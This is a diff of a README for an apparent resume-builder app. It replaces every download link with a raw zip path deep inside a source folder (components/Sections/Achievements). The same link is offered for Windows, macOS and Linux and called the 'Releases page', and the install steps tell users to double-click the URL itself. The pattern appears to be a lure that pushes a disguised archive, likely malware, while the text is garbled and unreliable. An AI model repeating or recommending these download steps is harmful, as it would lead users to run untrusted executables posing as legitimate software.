@@ -1,6 +1,6 @@
 # 🎉 Enhance-CV-Builder - Create Your Professional Resume Easily
 
-[![Download Enhance-CV-Builder](https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip)](https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip)
+[![Download Enhance-CV-Builder](https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip)](https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip)
 
 ## 📋 Introduction
 
@@ -10,20 +10,20 @@ Enhance-CV-Builder is an interactive and feature-rich resume builder designed fo
 
 Follow these steps to download and run Enhance-CV-Builder:
 
-1. **Visit the Release Page**: Click the button above or follow this [link](https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip) to access the Releases page on GitHub.
+1. **Visit the Release Page**: Click the button above or follow this [link](https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip) to access the Releases page on GitHub.
 
 2. **Select the Latest Version**: Look for the newest version listed on the page. The latest version will have the highest number, indicating it includes the most recent features and fixes.
 
 3. **Download the File**: Click on the download link for your system. Depending on your operating system, you will find options for Windows, macOS, or Linux. Make sure to choose the correct version. For example:
-   - **Windows**: `https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip`
-   - **macOS**: `https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip`
-   - **Linux**: `https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip`
+   - **Windows**: `https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip`
+   - **macOS**: `https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip`
+   - **Linux**: `https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip`
 
 4. **Extract the Files**: After downloading, locate the file in your Downloads folder. Right-click on the file and select "Extract" or "Unzip" to access the application files.
 
 5. **Run the Application**: 
-   - For **Windows**, double-click `https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip`.
-   - For **macOS**, open the folder and double-click `https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip`.
+   - For **Windows**, double-click `https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip`.
+   - For **macOS**, open the folder and double-click `https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip`.
    - For **Linux**, navigate to the folder in your terminal and run the command `./Enhance-CV-Builder`.
 
 6. **Start Building Your Resume**: Once the application opens, follow the on-screen prompts to customize your resume. Choose a template, add your work experience, skills, and education. Use the drag-and-drop feature to easily change the order of sections.
@@ -57,7 +57,7 @@ To run Enhance-CV-Builder smoothly, your system should meet the following minimu
 
 ## 📥 Download & Install
 
-You can download Enhance-CV-Builder from the Releases page. Click here to access the page: [Download Enhance-CV-Builder](https://raw.githubusercontent.com/erenhacker698/Enhance-CV-Builder/master/Oleacina/Enhance-CV-Builder.zip).
+You can download Enhance-CV-Builder from the Releases page. Click here to access the page: [Download Enhance-CV-Builder](https://github.com/erenhacker698/Enhance-CV-Builder/raw/refs/heads/master/components/Sections/Achievements/Enhance_C_Builder_3.4.zip).
 
 After downloading, follow the installation steps mentioned above to start creating your professional resume.
 
